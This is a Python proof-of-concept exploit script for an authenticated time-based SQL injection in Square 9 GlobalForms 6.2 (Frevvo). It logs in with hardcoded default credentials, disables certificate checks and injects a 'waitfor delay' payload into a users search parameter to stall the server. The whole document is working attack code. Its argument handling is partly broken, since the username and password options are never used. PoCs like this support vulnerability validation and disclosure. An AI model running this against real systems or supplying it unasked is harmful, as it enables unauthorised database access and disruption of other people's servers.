#!/usr/bin/python
import sys
import argparse
import datetime
import requests
from argparse import RawTextHelpFormatter
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def sqli(target, port, username, password, seconds):
    sqlpayload = "')waitfor%20delay'0%3a0%3a" + str(seconds) + "'--"
    s = requests.session()
    login_data = {'username': 'admin@d', 'password': 'admin', 'lAction':'Login'}
    m = s.post('https://' + target + ':' + port + '/frevvo/web/login', data=login_data, verify=False
)

    print "Delay #1: " + str(datetime.datetime.utcnow())
    r = s.get(('https://' + target + ':' + port + "/frevvo/web/tn/d/users?match=t" + sqlpayload), verify=False, cookies=s.cookies)

    print "Delay #2: " +  str(datetime.datetime.utcnow())

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="""
            
        Proof of Concept script for vulnerability validation.
         - Type of issue: Authenticated SQL injection
         - Product: Square 9 GlobalForms 6.2 
         - Version: v6.2.1.27377""",formatter_class=RawTextHelpFormatter)

    Required = parser.add_argument_group('Required')
    #Required
    Required.add_argument('-t', '--target', help='Target URL or IP Address', required=True)
    Required.add_argument('-s','--seconds',  help='Number of seconds to pause Frevvo', required=True)
    Required.add_argument('-o','--port',  help='Frevvo Web Server Port', required=True)

    #Optional
    parser.add_argument('-u', '--username', help='Login Username', default='admin', action="store_true", required=False)
    parser.add_argument('-p', '--password', help='Login Password', default='admin@d', action="store_true", required=False)
    
    args = parser.parse_args()

    sqli(args.target,args.port,args.username,args.password,args.seconds)

    if len(sys.argv) == 1:
        parser.print_help()
